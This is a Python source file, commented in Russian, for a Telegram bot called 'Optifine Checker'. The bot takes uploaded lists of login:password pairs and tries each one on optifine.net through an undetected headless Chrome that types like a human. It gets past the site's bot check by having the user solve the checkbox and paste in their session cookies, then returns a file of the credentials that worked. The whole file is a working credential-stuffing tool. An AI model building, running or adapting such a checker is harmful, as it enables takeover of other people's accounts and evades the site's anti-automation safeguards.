import os
import sys
import logging
import asyncio
import aiofiles
import time
import json
from datetime import datetime
from typing import Dict, List, Tuple

import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/app/debug/bot.log')
    ]
)
logger = logging.getLogger(__name__)

TOKEN = os.environ.get('BOT_TOKEN')
if not TOKEN:
    print("❌ НЕТ ТОКЕНА!")
    sys.exit(1)

ADMIN_IDS = [int(id.strip()) for id in os.environ.get('ADMIN_IDS', '').split(',') if id.strip()]
ALLOWED_USERS = ADMIN_IDS.copy() if ADMIN_IDS else []

bot_stats = {'total': 0, 'valid': 0, 'invalid': 0, 'start_time': datetime.now()}
active_sessions = {}
os.makedirs('/app/debug', exist_ok=True)

class OptifineChecker:
    def __init__(self):
        self.driver = None
        logger.info("🚀 Инициализация...")
    
    def init_driver(self):
        """Инициализация драйвера"""
        try:
            logger.info("🔍 Запуск Chrome...")
            options = uc.ChromeOptions()
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--start-maximized')
            options.add_argument('--headless=new')
            
            self.driver = uc.Chrome(options=options, version_main=145, headless=True)
            self.driver.set_page_load_timeout(30)
            logger.info("✅ Драйвер готов")
            return True
        except Exception as e:
            logger.error(f"❌ Ошибка: {e}")
            return False
    
    def set_cookies_from_text(self, cookies_text):
        """Устанавливает куки из текста"""
        try:
            # Парсим куки (формат: name=value; name2=value2)
            cookies = {}
            for item in cookies_text.split(';'):
                item = item.strip()
                if '=' in item:
                    name, value = item.split('=', 1)
                    cookies[name.strip()] = value.strip()
            
            # Открываем сайт, чтобы установить куки
            self.driver.get("https://optifine.net")
            time.sleep(2)
            
            # Устанавливаем каждую куку
            for name, value in cookies.items():
                try:
                    self.driver.add_cookie({
                        'name': name,
                        'value': value,
                        'domain': '.optifine.net',
                        'path': '/'
                    })
                except:
                    pass
            
            # Обновляем страницу
            self.driver.get("https://optifine.net/login")
            time.sleep(3)
            
            logger.info(f"✅ Установлено {len(cookies)} кук")
            return True
        except Exception as e:
            logger.error(f"❌ Ошибка установки кук: {e}")
            return False
    
    def check_login_page(self):
        """Проверяет доступ к странице"""
        try:
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            visible = [i for i in inputs if i.is_displayed()]
            return len(visible) >= 2
        except:
            return False
    
    async def check_account(self, login: str, password: str) -> dict:
        """Проверка аккаунта"""
        logger.info(f"🔍 Проверяю: {login[:20]}...")
        
        try:
            # Поиск полей
            inputs = self.driver.find_elements(By.TAG_NAME, "input")
            email = None
            pwd = None
            
            for inp in inputs:
                if inp.is_displayed():
                    if inp.get_attribute('type') in ['text', 'email']:
                        email = inp
                    elif inp.get_attribute('type') == 'password':
                        pwd = inp
            
            if not email or not pwd:
                return {'login': login, 'status': 'error', 'error': 'Поля не найдены'}
            
            # Поиск кнопки
            buttons = self.driver.find_elements(By.TAG_NAME, "button")
            btn = None
            for b in buttons:
                if b.is_displayed() and 'login' in b.text.lower():
                    btn = b
                    break
            
            if not btn:
                return {'login': login, 'status': 'error', 'error': 'Кнопка не найдена'}
            
            # Ввод данных
            email.clear()
            for c in login:
                email.send_keys(c)
                time.sleep(0.03)
            
            time.sleep(0.5)
            pwd.clear()
            for c in password:
                pwd.send_keys(c)
                time.sleep(0.03)
            
            time.sleep(0.5)
            btn.click()
            time.sleep(5)
            
            # Проверка результата
            if 'downloads' in self.driver.current_url:
                return {'login': login, 'password': password, 'status': 'valid'}
            return {'login': login, 'status': 'invalid', 'error': 'Неверный логин/пароль'}
            
        except Exception as e:
            return {'login': login, 'status': 'error', 'error': str(e)[:100]}
    
    def close(self):
        if self.driver:
            self.driver.quit()

# --- Telegram handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Нет доступа")
        return
    
    await update.message.reply_text(
        "👋 **Optifine Checker**\n\n"
        "📥 Отправь .txt файл с аккаунтами\n"
        "Формат: логин:пароль\n\n"
        "🔧 /debug - для админов"
    )

async def debug_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Нет доступа")
        return
    
    try:
        files = os.listdir('/app/debug')
        if files:
            for f in files[:5]:
                with open(f'/app/debug/{f}', 'rb') as file:
                    await update.message.reply_document(file, filename=f)
        else:
            await update.message.reply_text("📁 Папка debug пуста")
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {e}")

async def process_file(file_path, update, context):
    async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
        content = await f.read()
    
    accounts = []
    for line in content.strip().split('\n'):
        if ':' in line:
            l, p = line.split(':', 1)
            accounts.append((l.strip(), p.strip()))
    
    if not accounts:
        await update.message.reply_text("❌ Нет аккаунтов")
        return
    
    session_id = f"{update.effective_user.id}_{int(time.time())}"
    
    keyboard = [
        [InlineKeyboardButton("✅ Я нажал галочку", callback_data=f"done_{session_id}")],
        [InlineKeyboardButton("📋 Как скопировать куки", callback_data="help_cookies")],
        [InlineKeyboardButton("❌ Отмена", callback_data=f"cancel_{session_id}")]
    ]
    
    await update.message.reply_text(
        f"📊 **Аккаунтов:** {len(accounts)}\n\n"
        f"**ИНСТРУКЦИЯ:**\n\n"
        f"1️⃣ Открой в браузере на телефоне:\n"
        f"`https://optifine.net/login`\n\n"
        f"2️⃣ **Нажми на галочку** (один раз)\n\n"
        f"3️⃣ **Скопируй куки:**\n"
        f"   • iPhone: Нажми Aa → Настройки сайта → Куки → Выбрать все → Копировать\n"
        f"   • Android: Нажми замок → Cookies → Скопировать\n\n"
        f"4️⃣ **Вставь куки сюда:**\n"
        f"Отправь мне сообщение с куками\n\n"
        f"5️⃣ После этого нажми кнопку",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    
    active_sessions[session_id] = {
        'user_id': update.effective_user.id,
        'accounts': accounts,
        'file_path': file_path,
        'cookies': None,
        'step': 'waiting_cookies'
    }

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Обработка текстовых сообщений (для кук)"""
    user_id = update.effective_user.id
    
    # Ищем сессию пользователя
    for sid, session in active_sessions.items():
        if session['user_id'] == user_id and session.get('step') == 'waiting_cookies':
            # Сохраняем куки
            session['cookies'] = update.message.text
            session['step'] = 'cookies_received'
            await update.message.reply_text("✅ Куки получены! Теперь нажми кнопку 'Я нажал галочку'")
            return
    
    await update.message.reply_text("❌ Сначала отправь файл с аккаунтами")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "help_cookies":
        await query.edit_message_text(
            "📋 **КАК СКОПИРОВАТЬ КУКИ:**\n\n"
            "**iPhone (Safari):**\n"
            "1. Открой сайт\n"
            "2. Нажми **Aa** в адресной строке\n"
            "3. Выбери **Настройки сайта**\n"
            "4. Нажми **Управление куками**\n"
            "5. Нажми и держи → Выбрать все → Копировать\n\n"
            "**Android (Chrome):**\n"
            "1. Открой сайт\n"
            "2. Нажми на **замочек** слева от адреса\n"
            "3. Выбери **Cookies**\n"
            "4. Скопируй всё\n\n"
            "**Что должно получиться:**\n"
            "`__cfduid=d8f7sdf7; sessionid=abc123; ...`"
        )
        return
    
    data = query.data
    if data.startswith('done_'):
        session_id = data.replace('done_', '')
        
        if session_id not in active_sessions:
            await query.edit_message_text("❌ Сессия устарела")
            return
        
        session = active_sessions[session_id]
        
        if query.from_user.id != session['user_id']:
            await query.answer("❌ Не ваша сессия", show_alert=True)
            return
        
        if not session.get('cookies'):
            await query.edit_message_text(
                "❌ **Сначала отправь куки!**\n\n"
                "1. Нажми на сайте галочку\n"
                "2. Скопируй куки\n"
                "3. Отправь их мне"
            )
            return
        
        await query.edit_message_text("🚀 **Начинаю проверку...**")
        
        checker = OptifineChecker()
        if not checker.init_driver():
            await query.message.reply_text("❌ Ошибка запуска")
            del active_sessions[session_id]
            return
        
        # Устанавливаем куки
        if not checker.set_cookies_from_text(session['cookies']):
            await query.message.reply_text(
                "❌ **Ошибка с куками**\n\n"
                "Попробуй скопировать еще раз.\n"
                "Формат: name=value; name2=value2"
            )
            checker.close()
            del active_sessions[session_id]
            return
        
        # Проверяем доступ
        if not checker.check_login_page():
            await query.message.reply_text(
                "❌ **Страница не открывается**\n\n"
                "Возможно, куки неправильные или истекли.\n"
                "Попробуй еще раз."
            )
            checker.close()
            del active_sessions[session_id]
            return
        
        # Проверяем аккаунты
        results = {'valid': [], 'invalid': []}
        total = len(session['accounts'])
        
        msg = await query.message.reply_text(f"📊 Прогресс: 0/{total}")
        
        for i, (login, password) in enumerate(session['accounts'], 1):
            if i % 3 == 0:
                await msg.edit_text(f"📊 Прогресс: {i}/{total}\n✅ Рабочих: {len(results['valid'])}")
            
            result = await checker.check_account(login, password)
            
            if result['status'] == 'valid':
                results['valid'].append(result)
                bot_stats['valid'] += 1
            else:
                results['invalid'].append(result)
                bot_stats['invalid'] += 1
            
            bot_stats['total'] += 1
            await asyncio.sleep(2)
        
        # Отправляем результат
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        if results['valid']:
            fn = f"✅_РАБОЧИЕ_{len(results['valid'])}шт_{timestamp}.txt"
            async with aiofiles.open(fn, 'w') as f:
                for acc in results['valid']:
                    await f.write(f"{acc['login']}:{acc['password']}\n")
            with open(fn, 'rb') as f:
                await query.message.reply_document(f, filename=fn)
            os.remove(fn)
        
        await query.message.reply_text(
            f"✅ **ГОТОВО!**\n\n"
            f"Всего: {total}\n"
            f"✅ Рабочих: {len(results['valid'])}"
        )
        
        checker.close()
        if os.path.exists(session['file_path']):
            os.remove(session['file_path'])
        del active_sessions[session_id]
    
    elif data.startswith('cancel_'):
        session_id = data.replace('cancel_', '')
        if session_id in active_sessions:
            if os.path.exists(active_sessions[session_id]['file_path']):
                os.remove(active_sessions[session_id]['file_path'])
            del active_sessions[session_id]
        await query.edit_message_text("❌ Отменено")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ALLOWED_USERS and update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Нет доступа")
        return
    
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Нужен .txt файл")
        return
    
    file = await context.bot.get_file(doc.file_id)
    path = f"temp_{update.effective_user.id}_{doc.file_name}"
    await file.download_to_drive(path)
    await process_file(path, update, context)

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("debug", debug_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("✅ БОТ ЗАПУЩЕН!")
    app.run_polling()

if __name__ == '__main__':
    main()